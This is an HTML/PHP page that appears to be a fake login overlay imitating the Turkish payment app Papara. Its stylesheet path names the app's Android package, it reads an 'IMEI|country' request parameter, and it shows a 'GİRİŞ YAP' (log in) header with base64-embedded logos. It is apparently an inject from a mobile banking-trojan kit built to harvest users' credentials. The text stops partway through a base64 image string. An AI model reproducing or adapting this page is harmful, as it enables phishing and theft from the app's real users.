<html>
<head>
		<link href="tr/com.mobillium.papara/style.css" rel="stylesheet">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>

<div class="header">
	<img style="width: 10%;float: left;padding: 2%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgCAQAAABIkb+zAAACTUlEQVR42u2bPXITQRCFX8+uyhE5uxEFFHcgMlyBFIqiuAQB5sfGnIGAIgKbhDMguAhEiBPgwNqZ52DRnyWtbNBK2/CeUtXW6+5vpmdmZwFJkiRJkiRJ+kdFY0bzaz+MwvBpPwN4g4/Zm4TizX7BLyQPp6vhxX4OsGCfZCR5QHMVwm/7n0kOWZEkXzsaC1PwnDKRjEwkDxlchDCT/cRakXE8FtYcQli3fatY4Ah3MUSGiVkDUPmDZ5R/knza+VGwEJ6R/Redn0qn7M9nf6/79pvg2fOUfcEjeASP4BE8gkfwCB7B4wye5B+e5wADc4b1/9qFJ5H8xSfbTGx+6a16Pt6qE4ThHd7yGgJSC+4CKvy0YdNf7CLwWGSBj9idsT8K4jtO0UPE+rfrCTv4gYf2jcHSH1eAwSJLfMAuqjn7gOF6q4TsrHKYr7SfeBXvz8Ezmye2Yt0Q0cPJKjQbA6BZYolPuL3U/tqPxuaebhs9mevYLGRksAHv4XhLCAXEv346A8ByrgNsSgPeau7wK2chS8xswAc4bpxG2+gC9TRarSrURRtZiSPcORdCQsAbPMOV7TWyyywlyoVLiZP63LnzYgawXLKYO+j8Ym6qCv2Fy+mXnV9ON4BUV+GVjxCaQHJVhb7/EASSQBJIAkkgCSSBJJAE0n8EUv0CxLyCFMdV6PadOauY2wD30Udv5lDKgFbOLTYCUn1zdJ/m5+boBKTRxdd9FyNgYQjRxRvMJSAV/OqmCywJ4SYfMXdpfzrrnr/h8P0JiiRJkiRJkiQ16gxTGgfe33qOHgAAAABJRU5ErkJggg==">
	<h3> GİRİŞ YAP </h3>
</div>

<div class="logo">
	<img style="width: 20%;padding: 60px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAgAAAADyCAYAAAA7vX3BAAArAElEQVR42uyde5hkRZmn31M0DW3LpRCUiwgUDSLKgBYw4G2YmWqlvYzXah0daZSZamfdVddmtht3dwZHB7uftZ1RR92ux1EaFWctL6uOjtCFoIuKDqUIoihQQLcXUKRo5N50x/4RcaqyMk9mxsk8J84lf+/z5FNVmVknIr74nYjvxOWLyBiDEEIIIQaLIZlACCGEkAMghBBCCDkAQgghhJADIIQQQgg5AEIIIYSQAyCEEEIIOQBCCCGEkAMghBBCCDkAQgghhJADIIQQQgg5AEIIIYSQAyCEEEIIOQBCCCGEkAMghBBCiJQs6fcC21eNg4kSPzOQ+Jk9gDiKf2l4z73v3lh8ULF9f/HpxUnvgWm4Rvw905TQ/HcWpbXwnr1m8t+LrxW1/xswTeVv/LvRPs02afy70TbN5TfNZWwsn2m1h2mxW0P6pvk6i8tmFtkj8imTSSjfjIFJYLIl/6nL4lGuTmV0eU38vWMZO9VTpzpLKFeKsgDbjGEsoTzTzqZTHcvno8c2ZWu+R9vrsKWc24Cx5nvSwDREDXluuicX3ddR5/ea7vXFeU2+L2PesftcADYPbd0GjC3OQOTyyeT55pwpdRdCIwBC9McosMW9RDaMAZ8FxpXnfPL5vuiScclMyAEQIhsmKtZhVYFx5Vm2FUIOgKjKU6CQA6B8CiEHQAwYIzKBEELIARBCCCGEHAAhhBBC5MUSmUCIyrBSec6HdXvWrJS8hEYAhBBCCKERgD4Yw+75HgWGG342MgPMYYNtzAJZBdsYbpM+bdKfda9p916ZKLos4w1pN9bhnLv+jKu3mZqVPU57xP1MSnu26TXlfop8GG3QQ1w/qg8heiQyxvR1gaZIgCPY/d0TwHAPkQDnIJoCNmGY7SES4Aiw3hCNA8M9RgKcBSaNYRKiufmv9BYJcNSYaFHnYUw034kaWImJppNsYmAEovUYxs18p5s6EqAti424NpciEuAwhgmI1s+n3T0S4DSwycB0l0iAjRHlpo2Jh4gXlWXEwHoM41ZHPUUCbKlHz0iAI8B6YNyYaDixvJ0jAU5jmDTzzmyQSIBTLr04EuCogWtbykdLJMApY6LV7e7LLpEA17v7fKRNJMBJDGtpHwlwyt3r3SIBDkMUtykjPUQCnMWwCaLJHiMBTgFTigQo6kiWUwDrgVvdz+E+nrom3HU29pD+tbHz0Uc5RlzacVl6/f97XH42uuuMNTxJlrksYw32T5P2mGvs12ego6LKHmu4n7TjCHfbCLfNcdylOdYwIjLr+X+9sMXZtlP5plPmud13bvVIq5sOtrjrjPVq2/dFlyhmhZAD0KbTvraHDtu3I/BpiLf00GH5lGsj/iFrhxsamn6coCLLMuE6rn7STmOzspR92HVGWWp4zOl3NOD9PNHw+2SKDi4No03pJDGH/3TeRActfDZDLYz06aBOIIQcgAV2rBofdjdVXo3cqEeHtD7nm3PCo9EYb3hy7NfpKaosY2QXn9/HZmUq+0byifQ2XMBIQMxUinus1zTaMdXn9fLUwsYer61IgEIOQIKXnvcTzmiHjmmE/oecfTun4Q4dSxZPKkWWJX4CzrqhrULZ83Y8hinm4KNZ/BZCpu3YfIbCp/vI9xjZjyYW0W4JUV8HYMeq8fGAXvF4m0a633niNI34RICn5qLKsjFQ2mUr+3Agx2OMYs498HkSH0kxQjHi0XGmGf5v56SFYCNCDDhLAt1A8Va/mT4axfW0zmtOeKYdb1ObTRhd8M3HGLApx6fmosoy3OMT8HRT2sMVLHtaxyPebhjbbTSlfqcD399TnvfpeJO2+3n676fzH/FMY5Oz5XQbHfiswYm3E5Zt268Q5XYAdqwaH0vx1LDBddxzCTdxPDw67tk4TDQ4AT6dzgw2Etlch05sEwsrtztdbzShQc/qqbXIsqTp/GddGpNtOpH1pB9aLbLsPrqbayjzXMKIwrjnCEp8z4Tclx5PA4x61IHvSEYaxzAt457tyaYOOonjUvgsIB6XAyDkAORzowKspfNq5Dlgtes4fJ5UxhquN+LR2Gzq0Gk0N1qTdB5+HG76PcuhyiLL4luX3TrhKZd22kVWRZXdZzgbV+aZDvqddJ/77J4Yw391fpajAKMZ3c/dHIB+h/99HGqfkYpZ5yh0m57TOgAhByAnB2AyRWMXP72NeaQ73NDQZBmcYy7Fd9N0cI2R8qY7NNJFlMW3E5zr0vk3fm9Dw9OubwdVRNlHPTU841nHPh1OEccf+04DjHVxxHxiWPRbj6Oemp31rLuxLm2V9vYLOQBp2LFq3He+d1PKS28gjl7WvaHKIyrXeA7f7TYCkhe++RtNUTe+HWs8ZL6lIE37lt2nM05Td1MlfeKMQyOPedxX3RyAboRY4/BZT2cU7OjiOP5rC4QYKHrZBeDTiPUSg3vG82kr66eotAFbfBd/bSig809bFh9bzvVQjknCx2DvpR59NJlm5GE6sHbTOCc+9uvn836H//Hs1EdZiBTpW/ZNzmlIegmhEYAUZN1wNt+sWS1Y6tRxjzY8FaRtlEc9y78px3oLWZZeG/Vp8tlfH7LsWVOkA+AzOtFueN1nqiiLUbkZ/BcEx1EjG6fXdPCPEDk7ACOeN3Iv+NzAw57faTxFrt9taqE6zdBlGc6oTrLUQKiyDxLx03m3zrXdIsVQw/8zPehjoqmc0w0OgVb4C1GAA9BrpzHbZ/rjDa8iyaIxDFGWPEdzZkte9kFjOkcHIIvhfxqe4kf60HOjbuL1D1OEj8EgROkZyum6eT41jrR5Kr8Wu0Ao705jLKNydBphCFWW0RzrcrrkZR80+lkHMJbBtX3ZkOG14tgh2+j/kC4h5ACUkAnCn7o2SGWZVT3WAp+n9OGEzt5n+1+WT9dT5LN4Nj4e+lo5l0LUwwGYoP/tZlPY7XqrVRaVveb4dNRjKZ/+sxr+byTP7bMj2BGmLZKDGHSWVDjv8TnvvTSC8ZbDaRa2Ho2pLCp7zYmDAg1n6ABM5ZTXtdjRp7yG7SdYCG0thByAjL3sXoaO09zovg1DvI99mvIuBKpTWVT28hI/rXfantm4HdAn5kWedRGfwTCRkyOw/v1DW6fesWeNtg+KgSSvKYBeV/H6zP9ON3jw3ZgEjsUuLCpzp1FUWWYLrsu61WMVSDMN0G2uPI/h/6Q0NgEHYad3sgwy1etJmELIAcig8e+1s/HZDz6NHUacS9EYFEGRZcnTARjJKK9VqceqMOVhy1HP+3iqgLyvdc7gQdhIfhs8y9QOLQgUcgBK4gD4bkvzDcWbZdpzBdoqr7LM5ViXIyUv+6A7AT6dYrfOscjRmDjozyY3MtA4QpCmjkc2D22V0yjkAGSIz9ahXr3xWfIJYDOe8fV8KbIsM551mdeT1aYa1WOVmPbQ5EQXbWY9/D/Kwomg7V5pRgg2pExbiIEjr0WAcUSuNFt5ujU4jQ141jfshMcTa1U6jjRl8XUA0i7qHCuoUa1TPeY9AjDX5X7b4nGNLNno0cmv9Bx1mGtwLjequoUIOwIQ33i+owDD2FW+Pvg24GmOxPVpJIpcKZxXWaZT1GUa1leg7HIC8h1FSMusZx2nwXeLn6aFhByAHEYBtnk4AcPYwBy+hwzNeToBPtuGxjzzmMcTTxqHJs+y+JRrHP/V0uvxG66drVk9DpIDkMfqfx8HwHeUsLFt6cq6PWs0KiTkAORAt7O7x93nvvPMUyk6zVHXKTQ3GmOuU9mWotNIu7Aoawcgz7L4Pslt6dIZx46c72jBZM3qsWr0c3zuVEH3QXwMsK8TsDGjdIWoJSEiAcY37Zamzibt0a5xIJj492kPx2G0Ie1+yDNaWNFlmXQdqc8IzEb33eajVn0XaTV3InWqx6qOAvQyXZPH6v84mmO3NmGchVMLk4JCxecZTOC/cFAIOQAB6CdM66amp7dJwoR93UD+88ZFl2Wte4r2ofnI1V7LO1vDehwEByDP4D/dohQ2anA92aw1kQMgBpa8pgCyHmadpXVHQYgzvicDPTUWXZZp8jt8JakuN9S0HqvGTA9OUZ4d5gbCTtFsUBhgIQcge7JubFe3aRhWk98c3qR7Mg5F0WXZQP7zoXNt6rIu9VjF9QVpO/TpnO0Xqq6m5RQKOQD5OQBZPVGu7dA5zGH3BmfZecy6Dmlt4Loouixx+lMFlK8u9VjFcwqmUtbhVID8rA2Qho6NFnIAcrz22j497FngVA9HYs59r9/hwxkWoogVNS9YdFniJ/Ssh2KnXF5mal6PU1RvVXmaaYBQ9px0WpjN4f7aQPsRRSHkAGTIhh6e7OI54lNT/t8m1+ivxe/EsHjee4P7Px9nIxRFlyVOv9+Fc1Ou/tM0uFWux3gkI8R0StYdbtlGOGYadDCbwbVifWjYXwhHZIxJ9Q87Vo1vo2HVtgEwUct1Ez4bxa4cHzUwCtGw/YIN7GPsTToD0VR8YdN6SRZnN+k9MO59d4FRiIZN3EAb2zDPf2dRWgvv2Wsm/20WFT5q/zdgmmzT+HejfebTN7T8vXC9aNSY+W1ScxDNLJTdpWsabGBa7WFa7NaQvmm+znxZRjGMGaJ46+bYonLY36fdv01jollg2sBcUvkaysOi/Hcuyygw7Moyh2HGq1ydyujsn/h7c10tqrdO9dSljM3lms9/97L4ladD+drrcQzY1kmDwJyxB+40lanN34tulJZ7cvH91myPRWWd/96o1R0jwAhE7idNaUWxDuORjWkMs833Zcw7dp+rXkAMLCG3Ac4U9FRUp0AfMwWmOzOgZR8EfGw7VYI8SgNCZMiQTCDEwOMzPTMtMwkhB0AIUS+6BWIKsfpfCCEHQAgRmG5RHdX5CyEHQAhRI4ax5yt0C7+r4X8hasgSmUCIgaA5bv4odui/2+E7Gv4XQg6AEKLCbOzx/9T5C1FTNAUghOiEAucIIQdACDFg+ERiFELIAZhHMbaFqD5x3HwhhBwAb7RiWIjqd/4r5cwLIQcgLZMyqxCVZZr0B3EJISpIlrsAplznrxEAIcrHLO7wnCZm3JP+tHup4xdiQEh9GqAQQgghqo92AQghhBByAIQQQgghB0AIIYQQcgCEEEIIIQdACCGEEHIAhBBCCCEHQAghhBByAIQQQgghB0AIIYQQcgCEEEIIIQdACCGEEHIAhBBCCJEtfZ8GuP3s1S3vLRwvFDX+0eF7yd9t/ddo0QfJl44W/t90+bztRaKFt1vyFLXNpGm6fvymSUi722eL8xa1JmcW3jeJho2Si2Za3h8CjjEmOg44DlgBHA4cYuAQiA7GsA+wPNaLWaiv3cD97r05YA6iezDMAXcbuAO43b6i24E7W+skSqiHZPsvsr1pY3OTXA/GdNJHkiba29x0t6nLR1KdJrzXpP3m95LuE5OgaWPS27VXm2ZiuxT2NO3ah/b2tLq2mna6jg7HxLrmYGAfiJYDS5pstxu4373ndM09EM0ZuBuzWNcG7uxmv7612u2+b2vL9m2BabJdO5u202m7tt60abPbtefJ7XDnz0yHjqJdG53YPifmLRoCjqFBO8bYNpG4TSSpTaShTYwWace1j3cTt4lmoU1s35d1b+vX7VlTrAOQIxFwJHAC9hjTw4FDgSe7nwcB+7rXMmBp0/8/Cvzeve4Gfgv8ylXALPBz4CfAAwPm9O0LnAU8Dzjdvfbv8Vp7AQe43w8Aju7y/buBHwHXAT8AvgX8YoBsL01L10LaKY12yuQAHAQ831XCacAzgcf3cb2lwBPc6+gOvtWtwH8A33bGv6GGAt8PGAdeBowBjysoHwcDf+peMT8HrgS+ClwOPFIju0vT0nUdde3DcuB45+g+BTgCOMxp92BXd8sb7od93VN1I8PAvdJOftqJjDF9XaDPKYCTgFcBL4ZotHnspqApgF9D9DUDnwOuwLDLZ3ip7RBTsVMApwNrgde4my15uJoOw4Fth/2Shq0Xv999mHo+n/GXdwKfh+jTxt4ApoJTAFbThhcbotHGCxU4BfBr4GsQfc7AFcCuik8BnA6sNfAaTLS8kz17tZ2HVhe/19l+O4HPG/g0RFfOf6U+UwAHQXQmhj8ETjFwihvpos8pgGED92Y8BZDQJraZtkiskzaft/wS0bEva3eftLITY9tE4MrmrPY7BVCEA3AI8EZgjYET6fDdEqwBuAfDJ4GPAT+ukANwBkQXGnghHo1riRyAxvduAN6P4VLs0HeZHYBDjNM0sabLuwbgHuCTGKvpijkAZwAX4nTtY8+SOACN71tdw6UYHq2oA7AUeC7wIgMvAJ4BUZTDGoAsHYAzDFwI0QuTCldiB6DxuzeYWDuuTezXAQi5C+BE4BPY+Y1NLOr8Sz2E+zY3hHo5sLLk+T0cO3LxXZI6/2pxktPLLHAe5dyxIk1L13XUdbu+YiXwL9iFa1cA61x5ImmnmtoJIb4VwGfcE/S5tC5sqgorXYN5FXBmyfIWAX8N3ISdUqkTR7gRmO9h59DLgDQtXddR10kcDPwP7LqSy4E3Yefmy85AaGfz0Na+tJOnA/A44L3YVcmvLbmXmIY/Ar4DXAw8sQT5OQD4IvAR7MKWunIq8H1gQ4Fakqal6zrqOoknAx8GtgPvpvtq9jIxUNrZPLR1w+ahrT1pJy8H4LnAjU7Ue9fU+GtcGV9ZYB6OAq7BrmQdBJa4DvgLhF+1K01L13XUdTPDwGbgZuA/YbejVomB1c7moa2ptZO1AzAEvAv4ZsU8xl45GPg88FHCDwOvwG7zOoHB4+XAN1jYb5sn0rR0XUddNxNhF7L+DHgHdlte1Rh47Wwe2ppKO1k6APsDXwb+lsELMfxm10EcEtDLvQo7FzSo/CF2TnJ5jmlI0+E0LV2H03UzR2D3nH88cH1LOzloZ3N0ibd2smrUDnXGf/EAG/8M7DzqSM7p7Ad8bcCFHnM68K/kM3cqTYfTtHQdTtfNvBC4HlhVYXtJO03aeV90iZd2snAADgeuptwrWUOxAht5bUWOaXycamw3C8VLgHdmfE1pOqympeswum7mAuDfsVtDq4y006N2+nIAtp+9ehi4DDhWNp/nCOw83mE5XPv1wKtl4hYuBE7O6FrSdFhNS9dhdN3IXsAkcBHV38ki7bTRzvuiS7pqp2cHYPvZq/fBzo8+Q7Zu4UjsnNrjM7zmk4APyrSJLMFuWeq3MZOmw2paug6j6+bO/xLgr2pgH2mni3a6TQX0MwLwAezWKJHMM7FRs7JiI9UfqsuT59D/1h9pOqympeswuo6JXOf/uprYRtrpUzs9OQDbz179OuyBCqIzq4G3ZHCd44A3yJxdWd/H/0rTYTUtXYfRdSPvr1HnL+1koJ3UDsD2s1cfiY2wJPz4X06s/fBu7NCd6MwZwLN6+D9pOrympev8dd3IXwJvr5FNpB1P7bwvuuRZWY4AfJRiAlVUlWXAVnqfxzsMLXJJw+ul6dJrWroOo+uY07BrCeqCtJORdlI5ANtXjf8Zg70vulfOpPfhqjfK001F2oM/pOnwmpau89d1zHLs8bFLa2QLaScj7UTGGK8r7Fg1vsTAjZjo+G7fTTobvvP3kr/b7vzo5HOnm75D0nneTZ+3vUiUcL5z/GfUNpNJZ3s3nDV9J0THAg8mfEbi+dH2w1mIjmlJrt254A2fJRbNeJ8NvtvAdRBdh+EO7KEgO4H7DTzm6mtfbMjQAw08BTgaomMxnAYs637uekM+TXf7pzi7/niIbl5cvkR9LAFuhAVNpz7Tvp1NTatWfM6vT3qv1zPt/c6u97Zp0r21SNMpbTeL4Rhfe5p27UMXeybYzuma64A7INoO7DSG+4HH3Pf2BfY1hgOZ1zXHQnSagWXdbdpqP1+7ttWq/XE8hpsT7/u22uSfIXqL5z2faNN2Om3X1ps2bXa79jy5HY4Ahg3cm/DZrIFjSNlGJ7bPiXlLKL/9wm7iNpGkNpGGNjFapB1jR2GWkdB+t+/LPNp6/zb++PPNOTc3v7kkhRfxJuB4ysseyh2u9VDgrdiVq76cQqPQ82cX8G/Y4d1p4IEer7MUG5HqxdgDZg4LbOtTsYeZSNPl07R0nb+uY07HHuhTJ6SdDLXj1bjsWDW+BPhvJaj8XdioZO/Cnlj2B9htIHu7IaEIG7/9KcCfYOOZfwr4ZUnEez7pYnyHHJr+MvBUZ9cv9SF0gEexkfQucB7wW52nHAqf4CnSdDGalq7z1XXjY+xHqM+R1dJODtrxfbp4JcVGRrsBu/Xoidizyy/Envd8AzDH/NAdAL8HdgBXAluw85RPxu6J/DjwcIHleAJwborvvyhQvv4ndr/obTlc+1HgQ9g95D8OVJ6TpOnSalq6zlfXMauBUeqHtJOhdnwdgKKGkX7hGrtTnDd7bx/X+g5wHnbI9+ICBfx2T698qRu2yZsPAu8JkM5twBjwqwBpHSlNl1LT0nX+uo7b9X+oYecv7WSsna4OwI5V4ye4J5TQfB47HPop7FxoVuzAriI9G/hNAeVa4WnPk8l/5e4vsUNSobiL7ILIdOLgLp9L08VoWrrOV9cxr6aeZ1lIOxlrx2cE4PUFVPTfORHP5ZjGZe4p7LoCyvdGj++EGL6bpHFXQhi+RLqFTL3wBGm6lJqWrvPVdczfUE+knYy147MLIHToyL/FRnkKwa+Bs4BvA08PWMaXYw+eeaTDdy7GngmeJw8UcBMb7BGkx+WYxlJpupSarruuv16wruNO8lTKxf3ALHb667eufnZ5/N8j0k6+2unoAOxYNf50YCSgIT5HmLmXRnZiV5Zei/8QW7/sD7wA+EqH7zxMsYu78uSnBaYtTRen6brr+iclyMNECfJwr3Py/x24BriVbKa8pJ2M6TYF8NKAebkNO4xoCrDDHcCfB07zZQwuRYbdlaal6TrqOn7KGy8w/etY2OP+OuCT2KHtPYhSaqebAzAWMC//BTtUVBTTwCcCpnf2AIv9tALTlqal6TrqGuCFwHAB6f4Wu7NlFHvc8MOISminrQOwY9X4UuDZgfLxdeCrJaiE8wkXnOEI7Gr0QeMw4CUFPiFJ09J03XQd8/KCnMyTyH5ni7RT8AjAs2iMXZwvZdmzeg9hT8163gCKfTN2sVgRSNPSdB11DTYOw6rAaX4KG5jnLvXh1dROJwfg9EB5uAYbIrEs/CPhhrCeM2BC/wfCz0tL09J03XUN8AzCxpf/MjYC5C5EZbXTyQEIFUZya8kq5G5sSNYQjA6IyA/Ebt95Z8H5kKal6TrqGsIGtvoZdpHfbvXf1dZOJwfgpADp7wI+W8LKuThQOk8j3JB0ETweGyb2ZuA1JciPNC1N11HXEG7qxWB3tjyAqLx2EuMA7Fg1PkSYxTxXY+coy8YV2L2sB+aczl6uwfxBjQS+F7ASexjJq7D7w8uANC1N11HXMaFWkV8KfFf9eD200y4Q0BGBvPgrSlphu4FthNlT+9SKN5aHYYPrnAE8F7vKfr8S5lOalqbrqGucU3dMoKf/C9Wf10c77RyAYwKlf0WJK/GyQI3l8SUX8zD2YJEjsUfQxq8V7ol6/4rclNK0NF1HXUObs95zYBq4Rf17fbTTzgE4MkDau4Efldg219SsY+pEBBzlGpI/cCI+zon8oJrctNL0YGl6UHQNdsQlBFsZHAZCO+0cgEMDpP1z4KES2+Ym7KlQj6tBx9TME4AzsVu2zsTuj9+v5je0NF1vTQ+qriHM2pb4wJq6MpDaaecAhPBwri+5bXa7PJ6RczpPDlTPz8YeELOKMKvhy4Y0XS9NS9cLHBUgjR8Av6tZ3zfw2lnSwRvKm9srYJ9bAjSWT8zpukPYvcFvAF5J8QeVlMHDl6arrWnpujiH6z9qYCdpp0QOwB0VsM9sgDQOdPXwWEbXOwR4C3BewCcxOQDSdJ6alq6LHwG4ocL2kXbkAPTEbYHSGcaeqNUPK7AHv6wB9pW0pekaaFq6Lo+2q7j6X9rp0QEYCpD2PRWwT6hDLpb30VgeDPw9MIENOCGk6aprWrr2Z/8O7XiW/KJCNpF2+nQAQnBvBewTqkHvVaTnAu+nmDPAhTSdh6al63SE2pL2m4rYQ9qRA5AZoVa97tfDTf8J4M8kYTkANdF0rOuLgZdKSqlGAELwaAUcIWmnQg7AwxWwT6gGPc3w9DOArwBHS76lQ5ruTdPSde+EOkf+vhLbQNoJdJMOGo8FSsfXiz8L+LaELmqkaem6P5YPePmlnYo6AA9VwD6mRHl5PvA1qhWjPImfYlfm1hFpWroW0k5ltFOkA/BYBSrm9yXJx4nAl6juOesPYufnnuvKsllP1wOvaelaSDsFa6fINQAHUP5tU6E8y05PjvsB/5f8z3HPmoeddz4F/Btw/wA0StK0n6ala9EP0k4NHIADK9BYhgoV+UiHzz6EPYWqCtwDXO4880FsHKVpP01L16IfpJ2aOABV8DRDsKfN+2djo1iVlT3A97CnhF2GjRe+Z4AbJmm6u6ala9EP0k5NHIAnVkBsoYJsJG2x2Rv4QMnscT/wXeyq2++43/U0JE37alq6Fv0g7dTIATiyAvY5vMCnpXOA4wsu/93AN4Gr3c/rsUfKCmm61xEA6Vr0irRTIwegCqcyPTmgqBoZAtYXVOadwFbgM9ihLIOQpvvXtHQt+kHaqZkDcLSe6AC7WvrBpvfGCL/I5TfAe4HJhPwIabpfTUvXoh+knZo5ACdVwD5PK+hJ6Q2By/kR4ALChfvcu6aNlDTdXtPStegHaadmDsAJ2GGdMq+uPSGQl9nIPoQ75OdB4C+ALwa2a13Dl0rTyZqWrkU/SDs5UWQkwGWUey/nMGGGS5uflp5DmGAtDwGrChB6nRtKabr9CIB0LXpF2qmhAwA2DGJZOTNQOnc1/f2ngdI9D/hWQbZ9Us7XN9J0qTQtXVdf10Ui7eSkHTkAnb3OENzS9PfpAdKcwq5oLYqjcr7+Tmm6VJqWrquv6yKRdnLSTtEOwEogKqnoxgKlc1PT38/KOb09wDsLtu1xRYhdmi5M09K1HIB+kHZq6gAcAZxaQsEdCpxWwNPSE8g/Utu2Nk9oIcnbtndL06XRtHRdD10XhbSTo3aGSlDBryyh6F4W8CmuUXgrAqT3lRLY99k5X/830nRpNC1d10fXRSDt5KidMjgA51K+/bPnBUrnThafz35YgDS/V7Btn0n+4Wh/IU2XRtPSdX10XQTSTo7aKYMDcCjh9nj6cArhhkp/1PR3iMNkbi/Yvq8q4AlUmi5O09J1fXRdBNJOjtoZKkklv5PyLJzaEDCtmaa/Q+wF/V2Btt0beGOAdG6Wpkujaem6XroOjbSTo3bK4gA8CztHWTRPB1YHTK956OmAAGkOF2jfVxPmNLobpOnSaFq6rpeuQyPt5KidoRJV9D8Cjysw/Qj458BPbd9u+jvEsZJPKci+S4F3B0jnPuBWabo0mpau66frkEg7OWqnTA7A0cBFBaa/FjgrYHo30jr09PsA6Z5ckH3fARwbIJ3vUp6IadK0dF1HXYdE2slAO+ebc0oZCbCZtwGvKSDdU4H3B07z8oLE/vwC7HsK8K5AaX1Lmi6VpqXreuq6Tg7AwGpnqIQV/gny3xPZyAjwZexBLiH5esJ7Ifb5vpSwp0A+CXu4xtJA6W2Tpkulaem6vroOgbSTo3bK6AAsA6axIVXz5kTnHR0WuIz3Ad9MeH9HgLQPAcYDlfNg4GvYofAQ3AlcK02XStPSdX11HQJpJ0ftDJW00pc5I12QYx5fi51XO6KA8n0ZeCTh/dlA6f899oztPDkGuJr843g38gXKO086qJqWruut67yRdvrUTrv5/zI7AGCHZC5yBsty+HQF8DnsyU/7F1S2z3R4irojQPorgH/K8fqvBX4IPDWwXT9Z8sZsEDUtXddf13ki7eSonaEKCOBM7Nair2MjJvUybxIBfwx8GvgpYSIvteNO4LIOn/8gUD7e7DqjLLeIneTq6TOE2b/byI+BayrSqA2apqXrwdB1Xkg7PWrnfHPONd2eSKrCC93rAexc49XYY0dvwR51eJ/73nLg8c6jO841tn+CnXspAx+n897W/we8IlBeLsCuRn0rvYcZXYKd234L8CKKi373wQo2bIOiaVzZpOvB0HXWSDs5aWdJBcWw3Bn1RRXM+27go12+Mx04T6tcp/NF4F9dR9Tp2NF9gKcBp2O3z7yIYiNpxU+gn6pwA1d3TUP4VezSdX2QdnLSzhJpKyhTdD/R6wbgNuyCkVDshQ1J+Wr3913Ab4F7sQu7lgAHYg+5eVIJ7fpe4CHJq7Salq6l636QdnrQzvnmnK7akQMQDoN/2MfPYA+TKYonlVTUSfzc8wlUFKtp6Vq67gdpJwftDElXwbgU+Inndz/B4G77SctbgV0yQ+k1LV1L1/0g7aTQzvnmHC/tyAEIw8PYxSW+3ILdMy46s5Xuq89FOTQtXUvX/SDteGpnnTnHWztyAMJwEekjWr1HZuvIrHtKEtXRtHQtXfeDtJOxduQA5M+NwKYe/u8abHQ10cpD2DPu75MpKqVp6Vq67gdpp4t21u1Zk0o7RToAWwegUh4F/sL97IX/SvvwqoPMucBMCfMlTUvXddR1mZB22mhn3Z41qbVTpAPwduCXNa+UvwGu6+P/Z0k/z1p3/jPw2ZLmTZqWruuo6zIh7SRoZ92eNT1pp0gH4F5sfOTdNa2US8gmitcH0IKgxg72wyXOnzQtXddR12VD2mnQzro9a3rWTtFrAK4G1tewUr4B/FVG19oDvJ7ew1LWgV3Am9yNX3akaem6jrouE9KO0866PWv60k4ZFgFuBj5Wo4r5PvBK+psjbeZ32PCSdw+g0H8LvAC7D7gqSNPSdR11XSaknQy0U5ZdAG8GvlKDirnaVczOHK59M/YAmLsGSOjfwh7McVUF8y5NS9d11HWZkHZq4gDsxsZc/lKFK+b/YE+A2pljGjdgT4L7ec1F/iB2te8fA7+qaBmkaem6jrouG9JODRwAsMOLrwL+pYIN/QXAn2Ojo+XNbdhTp+q6H3YKOAH4J+xcX5WRpqXrOuq6bEg7NXAA4obnL4G3AY9VoGJuAf4I2EjYONU7gZcDfw3cXxORTwNnYAOh7KjRzStNS9d11HXZkHZq4ADEfBB4HuUd1nkEe1TnScC3C8qDAf43cKLzEKvIY9i9z2dgh5q/V+MGSpqWroW0UyrtlDkU8DXAM7Exx8sS+Wk3Ntrb07BHUz5cgjztcB7iGcDXKyLynwH/HTgKeM0ANZDStHQtpJ3SaKfsZwE86Ixyomukigqw8nvgQ9h5mHOxc05l43vAKuBkYIvLc5k88++6ujzJ2fEiBnMhlDQtXQtppxTaiYxpnebbsWr8Kuw8YEuOMZFXydzlO80iRos/av1u679GRwFrMZwHPDH50gv5M6bL58mJABHGBlr4BoZLgS/g5pUMUdtMmqbrx2+ahLS7fbY4b1FrcmbhfZNYAdEyAy/Bvl4AHIqrv6Qim4R6NR3rJUoo+/z7u4AfGivw7wBXQfSb5DqJEuohaipn/GvUkmCLzU1yPRiD03SSPpI00d7mrfaefy9anI+o6/1j4CiI5jWdZN+k+8QkaNqYrnbdZWxAn0sxVtO92jQT23W35+K6t28uc5p+iYEXYKJDO2mzV9u10eouAz/ELNa18bBfSq2mue/PAq5sb8s273e655Pfjzq30R1s3tLWNdk5sRHr/Jnp0FG0a6MNLIMooU1sk+fEOmnzecsvLff5LuCHxG2iWWgT23ZDHm39uj1rBsoBiD/YCzjLwCuw8yTHZ+AA7AF+AnwLoisNXA7c5yuuEjoAje9Hzss8CxOdbOw+0qcD+/TpADwE3A78zMBNwE0Q/RTD9cDD3RtaOQANttzLNeavMLASouMzcAD2YGJNcyVEl5v4pDnTn00LdAAWd0omOsnZ7WTgFANPh2ifPm33EHC7MfyMeV3zU4iuN/BwN60GdgC62DIzB4AaOACNNm1oE2lqE/tyAFybGC3SjsG2iUmdepEOwJKKDu3sBq5wL5wnN4qdX10BHOOepg4G9gYOwM653oeN134n8Gs37Hmz6/ivBx6o6VCYceW7vqnuD294HQocCCx1nx/obPYgdoXtA24I7dfOfr8q2ZBa1ZGmpWsh7QRlSU0q807gq+4l/HgM2O5eQpqWroW0M2DaGVKdCyGEEIOHHAAhhBBCDoAQQggh5AAIIYQQQg6AEEIIIeQACCGEEEIOgBBCCCHkAAghhBBCDoAQQggh5AAIIYQQQg6AEEIIIeQACCGEEEIOgBBCCCHkAAghhBBCDoAQQggh5AAIIYQQQg6AEEIIIeQACCGEEEIOgBBCCCEHQAghhBByAIQQQgghB0AIIYQQcgCEEEIIIQdACCGEEHIAuvKYTC9qhjQthJAD4MFdMr2oGdK0EEIOgAe3yvSiZkjTQgg5AB5cK9OLmiFNCyHkAHhwmUwvaoY0LYSQA9CF7cAVMr2oEdK0EEIOgAfvAXbL9KJGSNNCCDkAXdgGfExmFzVCmhZCyAHowveBccDI7KImSNNCCDkAHdgNfBg4C9gpk4saIE0LISrPkhyv/Uvgi66hvEmmFjVAmhZC1N4BuBi4KuW17gceAH4B3AjMyryiREjTQgjRQGSMpi+FEEKIQUOnAQohhBByAIQQQgghB0AIIYQQcgCEEEIIIQdACCGEEHIAhBBCCCEHQAghhBByAIQQQgghB0AIIYQQcgCEEEIIIQdACCGEEHIAhBBCCCEHQAghhBByAIQQQgghB0AIIYQQXfn/AwAvsV4Rd74TQAAAAABJRU5Erk